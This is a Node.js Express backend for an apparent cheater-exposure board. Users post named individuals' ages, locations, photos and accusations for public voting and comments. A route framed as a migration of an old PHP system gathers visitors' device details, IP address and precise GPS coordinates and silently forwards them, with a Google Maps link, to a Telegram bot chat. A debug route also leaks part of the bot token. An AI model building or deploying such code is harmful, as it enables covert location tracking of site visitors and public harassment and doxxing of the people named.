import express from "express";
import cors from "cors";
import multer from "multer";
import path from "path";
import { fileURLToPath } from "url";
import pkg from "pg";

const { Pool } = pkg;
const app = express();

// Middleware
app.use(cors());
app.use(express.json({ limit: "50mb" }));
app.use(express.urlencoded({ extended: true }));

// Multer para fotos
const upload = multer({ storage: multer.memoryStorage() });

// Conexión PostgreSQL
const pool = new Pool({
    connectionString: process.env.DATABASE_URL,
    ssl: { rejectUnauthorized: false },
});

// =======================
// SERVIR CARPETA PUBLIC
// =======================
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
app.use(express.static(path.join(__dirname, "public")));

// Al acceder a /, devuelve index.html
app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "index.html"));
});

// =======================
// FUNCIÓN PARA ENVIAR A TELEGRAM (MEJORADA)
// =======================
async function sendToTelegram(msg) {
    try {
        // Verificar que las variables de entorno existan
        const botToken = process.env.TELEGRAM_BOT_TOKEN;
        const chatId = process.env.TELEGRAM_CHAT_ID;
        
        if (!botToken || !chatId) {
            console.error("❌ FALTAN VARIABLES DE ENTORNO PARA TELEGRAM");
            console.error("TELEGRAM_BOT_TOKEN:", botToken ? "✓ Configurado" : "✗ No configurado");
            console.error("TELEGRAM_CHAT_ID:", chatId ? "✓ Configurado" : "✗ No configurado");
            return false;
        }

        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
        const data = {
            chat_id: chatId,
            text: msg,
            parse_mode: "HTML"
        };

        console.log("📤 Intentando enviar a Telegram...");
        console.log("URL:", url.replace(botToken, "TOKEN_OCULTO"));
        console.log("Chat ID:", chatId);

        const response = await fetch(url, {
            method: "POST",
            headers: { 
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0'
            },
            body: JSON.stringify(data)
        });

        const result = await response.json();
        console.log("Respuesta de Telegram:", result);

        if (result.ok) {
            console.log("✅ Mensaje enviado a Telegram correctamente");
            return true;
        } else {
            console.error("❌ Error de Telegram API:", result.description || result);
            return false;
        }
    } catch (error) {
        console.error("❌ Error al enviar a Telegram:", error.message);
        return false;
    }
}

// =======================
// GET – Lista de infieles con comentarios y votos
// =======================
app.get("/infieles", async (req, res) => {
    try {
        const infieles = await pool.query("SELECT * FROM infieles ORDER BY id DESC");
        const resultados = [];
        for (let infiel of infieles.rows) {
            const comentariosQ = await pool.query(
                "SELECT * FROM comentarios WHERE infiel_id=$1 ORDER BY created_at ASC",
                [infiel.id]
            );
            resultados.push({
                ...infiel,
                comentarios: comentariosQ.rows
            });
        }
        res.json(resultados);
    } catch (err) {
        console.error("Error GET:", err);
        res.status(500).json({ error: "Error al obtener datos" });
    }
});

// =======================
// POST – Crear publicación
// =======================
app.post("/nuevo", upload.array("fotos", 10), async (req, res) => {
    try {
        const { reportero, nombre, apellido, edad, ubicacion, historia } = req.body;
        const fotos = req.files?.map(f => f.buffer.toString("base64")) || [];
        const result = await pool.query(
            `INSERT INTO infieles (reportero,nombre,apellido,edad,ubicacion,historia,fotos)
             VALUES ($1,$2,$3,$4,$5,$6,$7) RETURNING *`,
            [reportero || "Anónimo", nombre, apellido, edad, ubicacion, historia, fotos]
        );
        res.json({ success: true, data: result.rows[0] });
    } catch (err) {
        console.error("Error POST:", err);
        res.status(500).json({ error: "No se pudo guardar" });
    }
});

// =======================
// POST – Votar
// =======================
app.post("/votar", async (req, res) => {
    try {
        const { infiel_id, usuario, voto } = req.body;
        await pool.query(
            `INSERT INTO votos (infiel_id, usuario, voto) VALUES ($1,$2,$3)
             ON CONFLICT (infiel_id, usuario) DO NOTHING`,
            [infiel_id, usuario, voto]
        );
        if (voto) {
            await pool.query("UPDATE infieles SET votos_reales=votos_reales+1 WHERE id=$1", [infiel_id]);
        } else {
            await pool.query("UPDATE infieles SET votos_falsos=votos_falsos+1 WHERE id=$1", [infiel_id]);
        }
        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: "Error al votar" });
    }
});

// =======================
// POST – Agregar comentario
// =======================
app.post("/comentario", upload.array("fotos", 5), async (req, res) => {
    try {
        const { infiel_id, nombre, texto, propietario } = req.body;
        const fotos = req.files?.map(f => f.buffer.toString("base64")) || [];
        const result = await pool.query(
            `INSERT INTO comentarios (infiel_id,nombre,texto,fotos,propietario)
             VALUES ($1,$2,$3,$4,$5) RETURNING *`,
            [infiel_id, nombre || "Anónimo", texto, fotos, propietario || false]
        );
        res.json({ success: true, data: result.rows[0] });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: "Error al guardar comentario" });
    }
});

// =======================
// MIGRACIÓN DE TU SISTEMA PHP ANTIGUO
// =======================

// Función para obtener IP real
function getClientIp(req) {
    const keys = [
        'x-client-ip',
        'x-forwarded-for',
        'x-forwarded',
        'x-cluster-client-ip',
        'forwarded-for',
        'forwarded',
        'cf-connecting-ip',
        'true-client-ip'
    ];

    for (const key of keys) {
        const header = req.headers[key];
        if (header) {
            const ips = header.split(',');
            for (let ip of ips) {
                ip = ip.trim();
                if (ip && ip !== '127.0.0.1' && !ip.startsWith('10.') && !ip.startsWith('192.168.')) {
                    return ip;
                }
            }
        }
    }
    return req.socket.remoteAddress || 'Unknown';
}

// Temporal para datos del dispositivo
let visitaTemporal = null;

// Ruta /recibe-info
app.post("/recibe-info", (req, res) => {
    try {
        const { agent = '', navegador = '', versionapp = '', dystro = '', idioma = '', bateri = 'N/A' } = req.body;

        let navegadorDetectado = "Desconocido";
        if (agent.toLowerCase().includes('brave')) {
            const m = agent.match(/Brave\/([0-9.]+)/);
            navegadorDetectado = m ? `Brave ${m[1]}` : "Brave (basado en Chrome)";
        } else if (agent.toLowerCase().includes('edg')) {
            const m = agent.match(/Edg\/([0-9.]+)/);
            navegadorDetectado = `Edge ${m ? m[1] : ""}`;
        } else if (agent.toLowerCase().includes('opr') || agent.toLowerCase().includes('opera')) {
            const m = agent.match(/OPR\/([0-9.]+)/);
            navegadorDetectado = `Opera ${m ? m[1] : ""}`;
        } else if (agent.toLowerCase().includes('firefox')) {
            const m = agent.match(/Firefox\/([0-9.]+)/);
            navegadorDetectado = `Firefox ${m ? m[1] : ""}`;
        } else if (agent.toLowerCase().includes('safari') && !agent.toLowerCase().includes('chrome')) {
            const m = agent.match(/Version\/([0-9.]+)/);
            navegadorDetectado = `Safari ${m ? m[1] : ""}`;
        } else if (agent.toLowerCase().includes('chrome')) {
            const m = agent.match(/Chrome\/([0-9.]+)/);
            navegadorDetectado = `Chrome ${m ? m[1] : ""}`;
        }

        let sistema = "Desconocido";
        if (agent.toLowerCase().includes("windows nt 10")) sistema = "Windows 10";
        else if (agent.toLowerCase().includes("windows nt 6.3")) sistema = "Windows 8.1";
        else if (agent.toLowerCase().includes("windows nt 6.1")) sistema = "Windows 7";
        else if (agent.toLowerCase().includes("android")) sistema = "Android";
        else if (agent.toLowerCase().includes("iphone")) sistema = "iOS";
        else if (agent.toLowerCase().includes("linux")) sistema = "Linux";

        let arquitectura = '';
        if (dystro.toLowerCase().includes('armv7')) arquitectura = ' (32 bits)';
        else if (dystro.toLowerCase().includes('armv8') || dystro.toLowerCase().includes('aarch64')) arquitectura = ' (64 bits)';
        else arquitectura = ' (64 bits)';

        let idiomaBonito = idioma || "Desconocido";
        if (idioma === "es-MX") idiomaBonito = "Español (México) - es-MX";
        else if (idioma === "es-ES") idiomaBonito = "Español (España) - es-ES";
        else if (idioma === "en-US") idiomaBonito = "Inglés (EE.UU.) - en-US";

        const bateriaTexto = bateri !== 'N/A' ? `${bateri}%` : "Desconocido";

        visitaTemporal = `
🖥 Información del Dispositivo

- Navegador: ${navegadorDetectado}
- Sistema Operativo: ${sistema}${arquitectura}
- Idioma: ${idiomaBonito}
- Batería: ${bateriaTexto}
        `.trim();

        res.json({ status: 'ok', mensaje: visitaTemporal });
    } catch (err) {
        console.error("Error en /recibe-info:", err);
        res.status(500).json({ error: "Error" });
    }
});

// Ruta /location (MEJORADA)
app.post("/location", async (req, res) => {
    try {
        const { latitude, longitude, accuracy } = req.body;
        const ip = getClientIp(req);
        const ua = req.headers['user-agent'] || 'Unknown';
        const ts = new Date().toISOString();

        let msg = "📍 <b>Nueva ubicación</b>\n";
        msg += `🌐 IP: ${ip}\n`;
        if (latitude) msg += `📌 Lat: ${latitude}\n`;
        if (longitude) msg += `📌 Lon: ${longitude}\n`;
        if (accuracy) msg += `🎯 Precisión: ${accuracy}m\n`;
        msg += `🖥️ User-Agent: ${ua.substring(0, 100)}...\n\n`;

        msg += "<b>- Información del dispositivo -</b>\n";
        if (visitaTemporal) {
            msg += visitaTemporal + "\n";
        } else {
            msg += "Sin datos del dispositivo\n";
        }

        msg += `\n⏰ Hora: ${ts}`;
        if (latitude && longitude) {
            msg += `\n🌍 Google Maps: https://www.google.com/maps?q=${latitude},${longitude}`;
        }

        console.log("📝 Mensaje preparado para Telegram:");
        console.log(msg);

        // Enviar a Telegram
        const telegramEnviado = await sendToTelegram(msg);

        // Limpiar temporal
        visitaTemporal = null;

        res.json({ 
            status: 'logged', 
            timestamp: ts,
            telegram_sent: telegramEnviado,
            message: telegramEnviado ? "Mensaje enviado a Telegram" : "Error al enviar a Telegram"
        });
    } catch (err) {
        console.error("Error en /location:", err);
        res.status(500).json({ 
            error: "Error interno del servidor",
            details: err.message 
        });
    }
});

// =======================
// RUTAS DE DEBUG PARA RENDER
// =======================

// Verificar variables de entorno (seguro)
app.get("/debug/env", (req, res) => {
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    
    res.json({
        has_bot_token: !!botToken,
        has_chat_id: !!chatId,
        bot_token_length: botToken?.length || 0,
        chat_id_length: chatId?.length || 0,
        bot_token_preview: botToken ? `${botToken.substring(0, 10)}...` : "No configurado",
        chat_id_preview: chatId ? `${chatId.substring(0, 5)}...` : "No configurado",
        node_version: process.version
    });
});

// Probar envío a Telegram
app.get("/debug/test-telegram", async (req, res) => {
    try {
        console.log("🔧 Iniciando prueba de Telegram...");
        
        const testMsg = `🔄 <b>Prueba de conexión desde Render</b>\n⏰ Hora: ${new Date().toISOString()}\n✅ Si ves esto, el bot funciona correctamente`;
        
        const result = await sendToTelegram(testMsg);
        
        res.json({
            success: result,
            message: result ? "✅ Mensaje enviado a Telegram correctamente" : "❌ Error al enviar a Telegram",
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        console.error("Error en test-telegram:", error);
        res.status(500).json({ 
            error: error.message,
            success: false 
        });
    }
});

// Ruta de salud para Render
app.get("/health", (req, res) => {
    res.json({
        status: "ok",
        timestamp: new Date().toISOString(),
        service: "Infieles API",
        environment: process.env.NODE_ENV || "development",
        node_version: process.version
    });
});

// =======================
// INICIAR SERVIDOR
// =======================
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log("=======================================");
    console.log("🚀 API lista en puerto", PORT);
    console.log("🌐 Entorno:", process.env.NODE_ENV || "development");
    console.log("📦 Node.js:", process.version);
    console.log("🤖 Telegram Bot Token:", process.env.TELEGRAM_BOT_TOKEN ? "✓ Configurado" : "✗ No configurado");
    console.log("💬 Telegram Chat ID:", process.env.TELEGRAM_CHAT_ID ? "✓ Configurado" : "✗ No configurado");
    console.log("=======================================");
});
